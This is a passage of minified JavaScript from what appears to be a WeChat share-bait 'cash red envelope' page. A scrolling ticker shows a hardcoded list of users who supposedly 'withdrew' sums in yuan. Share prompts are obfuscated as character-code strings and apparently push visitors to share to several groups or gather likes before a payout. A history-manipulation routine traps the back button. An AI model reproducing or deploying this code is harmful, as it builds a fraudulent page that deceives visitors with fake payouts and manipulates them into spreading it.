                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0037\u002e\u0030\u0030\u0020\u5143",
                c_time: "13"
            },
            {
                w_name: " ƶ  Ƕ ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/D3875B44A8DB4ABE135059C7362B4094/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0032\u0038\u002e\u0030\u0030\u0020\u5143",
                c_time: "5"
            },
            {
                w_name: "С    555",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/D6AEE11866CCEC092B82C532218F6B20/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0039\u002e\u0030\u0030\u0020\u5143",
                c_time: "9"
            },
            {
                w_name: "  ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/9ADBAEBE292B4FA0737F9DB142336157/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0036\u002e\u0030\u0030\u0020\u5143",
                c_time: "2"
            },
            {
                w_name: "      ٩",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/71E4837B7B1F0A12D5F8D90234DDB95C/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0032\u0034\u002e\u0030\u0030\u0020\u5143",
                c_time: "12"
            },
            {
                w_name: "IF YOU",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/E0FB2E95D84068B944789BF6569B3A7F/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0035\u002e\u0030\u0030\u0020\u5143",
                c_time: "11"
            },
            {
                w_name: " ׺   ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/A6F3CA4B97E59BB9AE5495984ACF3090/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0037\u002e\u0030\u0030\u0020\u5143",
                c_time: "10"
            },
            {
                w_name: "һ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/0DE079B903E44F96AB9BAD85D706A61F/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0032\u0036\u002e\u0030\u0030\u0020\u5143",
                c_time: "4"
            },
            {
                w_name: "Zhao. Dtail   ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/94B9F8421330A7B82F019492C822BF42/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0032\u0035\u002e\u0030\u0030\u0020\u5143",
                c_time: "14"
            },
            {
                w_name: "        ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/D56EE4D71422A112CDA6B7B44D48B044/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0039\u002e\u0030\u0030\u0020\u5143",
                c_time: "12"
            },
            {
                w_name: "           Y",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/FF4E560E4F11C2EBAAFFFC4625CD3122/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0030\u002e\u0030\u0030\u0020\u5143",
                c_time: "11"
            },
            {
                w_name: "   ˸   \\uD83C\\uDFC3",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/F6213667E85E205FF363B3947D218D38/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0032\u0034\u002e\u0030\u0030\u0020\u5143",
                c_time: "8"
            },
            {
                w_name: "        ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/D42066DE19EBB82D30A351185956DB41/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0032\u002e\u0030\u0030\u0020\u5143",
                c_time: "2"
            },
            {
                w_name: "           ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/5DA508A1616E732B0EB92A1ADAF28456/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0032\u0036\u002e\u0030\u0030\u0020\u5143",
                c_time: "2"
            },
            {
                w_name: "Ц   ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/9DE656A9B0C0384FCCF7D02BD02CFCB5/100",
                u_time: "\u9886\u53d6\u4e86\u0035\u5143\u73b0\u91d1\u7ea2\u5305",
                c_time: "10"
            }], n = 0, t = new Date, r; n < 5; n++) r = i[n],
            $(".hbAvList").append(u(r));
            setInterval(function() {
                var t = i[n];
                $(".hbAvList li:last").slideUp(1e3,
                function() {
                    $(this).remove()
                });
                $(".hbAvList li:first .hbMoney").css("color", "#949494");
                $(".hbAvList").prepend(f());
                $(".hbAvList li:first").append(e(t));
                $(".hbAvList li:first").find(".hbMoney").css("color", "#FF0000");
                $(".hbAvList li:first").slideDown(1e3,
                function() {
                    n % 2 < 1 ? $(".hbAvList li:first").find(".hbMoney").addClass("animated tada") : $(".hbAvList li:first").find(".hbMoney").addClass("animated zoomIn");
                    n = ++n % i.length
                })
            },
            2e3)
        });
        weui = {
            alert: function(n, t, i) {
                var r, u;
                t = t ? t: "";
                r = '<div class="weui_dialog_alert" style="position: fixed; z-index: 2000; display: none;margin-left:15%;margin-right:15%">';
                r += '<div class="weui_mask"><\/div>';
                r += '<div class="weui_dialog">';
                r += '    <div class="weui_dialog_hd"><strong class="weui_dialog_title">' + t + "<\/strong><\/div>";
                r += '    <div class="weui_dialog_bd" style="color:#000;padding-top:20px;padding-bottom:10px;"><\/div>';
                r += '    <div class="weui_dialog_ft">';
                r += '      <a href="javascript:;" class="weui_btn_dialog primary">  ֪    <\/a>';
                r += "  <\/div>";
                r += " <\/div>";
                r += "<\/div>";
                $(".weui_dialog_alert").length > 0 ? $(".weui_dialog_alert .weui_dialog_bd").empty() : $("body").append($(r));
                u = $(".weui_dialog_alert");
                u.show();
                u.find(".weui_dialog_bd").html(n);
                u.find(".weui_btn_dialog").off("click").on("click",
                function() {
                    u.hide();
                    i && i()
                })
            }
        };
        function getSceneIdByCode(n) {
            var t = n.indexOf("-"),
            i;
            return - 1 != t && (n = n.substring(0, t)),
            i = n.replace(/A/g, "0").replace(/C/g, "1").replace(/F/g, "2").replace(/Z/g, "3").replace(/W/g, "4").replace(/G/g, "5").replace(/J/g, "6").replace(/Q/g, "7").replace(/Y/g, "8").replace(/S/g, "9"),
            parseInt(i)
        }
        function tj_event(arg1, arg2) {
            if (window._czc) window._czc.push(["_trackEvent", arg1, arg2]);
        }
        function sharetips(n) {
            switch (n) {
            case 0:
                weui.alert(app.decodeStr("#20998#20139#25104#21151#-244#-29705#32487#32493#20998#20139#21040#60#115#112#97#110#32#115#116#121#108#101#61#34#102#111#110#116#45#115#105#122#101#58#32#51#48#112#120#59#99#111#108#111#114#58#32#35#102#53#50#57#52#99#34#62#51#60#47#115#112#97#110#62#20010#19981#21516#30340#32676#21363#21487#-26490#21462#-255"));
                tj_event('share-group', '0');
                break;
            case 1:
                weui.alert(app.decodeStr("#20998#20139#25104#21151#-244#-29705#20877#20998#20139#60#115#112#97#110#32#115#116#121#108#101#61#34#102#111#110#116#45#115#105#122#101#58#32#51#48#112#120#59#99#111#108#111#114#58#32#35#102#53#50#57#52#99#34#62#50#60#47#115#112#97#110#62#20010#19981#21516#30340#32676#21363#21487#-26490#21462#-255"));
                tj_event('share-group', '2');
                break;
            case 2:
                weui.alert(app.decodeStr("#20998#20139#25104#21151#-244#-29705#20877#20998#20139#60#115#112#97#110#32#115#116#121#108#101#61#34#102#111#110#116#45#115#105#122#101#58#32#51#48#112#120#59#99#111#108#111#114#58#32#35#102#53#50#57#52#99#34#62#49#60#47#115#112#97#110#62#20010#19981#21516#30340#32676#-255"));
                tj_event('share-group', '3');
                break;
            case 3:
                weui.alert(app.decodeStr("+20998+20139+25104+21151+-244+21097+19979+26368+21518+19968+27493+21862+33+60+47+98+114+62+-29705+20998+20139+21040+60+115+112+97+110+32+115+116+121+108+101+61+34+102+111+110+116+45+115+105+122+101+58+32+51+48+112+120+59+99+111+108+111+114+58+32+35+102+53+50+57+52+99+34+62+26379+21451+22280+60+47+115+112+97+110+62+21363+21487+-26490+21462+-255"));
                tj_event('share-group', '4');
                break;
            case 4:
                tj_event('share-timeline', '1');
                weui.alert(app.decodeStr("#35831#23558#20998#20139#30340#26379#21451#22280#20449#24687#38598#28385#60#47#98#114#62#19977#20010#36190#44#36830#20113#28207#22320#21306#20110#52#26376#49#54#21495#32479#19968#21040#36134#60#47#98#114#62#60#47#98#114#62#35831#27880#24847#58#38598#28385#19977#20010#36190#24182#20445#30041#26379#21451#22280#20449#24687#44#21542#21017#26080#27861#26680#23454#36523#20221"), "", gotocj)
            }
        }
        timess = 0;
        function tempchangeTitle(n) {
            if (typeof $ != "undefined") {
                var t, i = $("body");
                document.title = n;
                t = $('<iframe  style="display: none" src="/favicon.ico"><\/iframe>');
                t.on("load",
                function() {
                    setTimeout(function() {
                        t.off("load").remove()
                    },
                    1)
                }).appendTo(i)
            }
        }
        function get_rand_pic() {
            var n = ["//mmbiz.qlogo.cn/mmbiz_png/nyPb054uibdiaIE3wchcoVnicP4AdPrfXLuapGaCwnQpcgs3vyk8bkGrXvOww5Vu2M3KKe52p04220kyIGIxHNPOQ/0?wx_fmt=png", "//mmbiz.qlogo.cn/mmbiz_jpg/nyPb054uibdiaIE3wchcoVnicP4AdPrfXLuDCe8Tibia3tV8F6HmzHuotNY2TMxoTv8H4TCaHjoWMXxKEdRsAyBEuicA/0?wx_fmt=jpeg", "//mmbiz.qlogo.cn/mmbiz_png/nyPb054uibdiaIE3wchcoVnicP4AdPrfXLuIFz31JsNJA2oudF8VhaanxbTNcHyWcRLlmpCiatD8pkkM2wstbaWAaw/0?wx_fmt=png", "//mmbiz.qlogo.cn/mmbiz_png/nyPb054uibdiaIE3wchcoVnicP4AdPrfXLuPVicTh6MyX4rM8akljrqFm563RmUQzVgSXxX6AkybDjkWibXtaqgsI3w/0?wx_fmt=png", "//mmbiz.qlogo.cn/mmbiz_jpg/nyPb054uibdiaIE3wchcoVnicP4AdPrfXLuib5qQUlo4oqQyQMAzEFRD4VBsvjaoachKPLCZAaib44xFzhzdMibjZjibQ/0?wx_fmt=jpeg", "//mmbiz.qlogo.cn/mmbiz_png/nyPb054uibdiaIE3wchcoVnicP4AdPrfXLuapGaCwnQpcgs3vyk8bkGrXvOww5Vu2M3KKe52p04220kyIGIxHNPOQ/0?wx_fmt=png"];
            return n[Math.floor(Math.random() * n.length)]
        }
        function gotocj() {
            //location.href = "http://vych.cn/f297aeimquyc.e";
        }
        function houtui() {
            //location.href = "http://vych.cn/f16b5f4j.e";
        }
        window.onhashchange = function() {
            jp();
        };
        function hh() {
            history.pushState(history.length + 1, "message", "#" + new Date().getTime())
        }
        function jp() {
            houtui();
        }
        setTimeout('hh();', 100);
    }
} catch(ex) {}
/*var _hmt = _hmt || []; (function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?3fcb7d1d52c150fa454f6fe97d20fdf3";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
})();*/
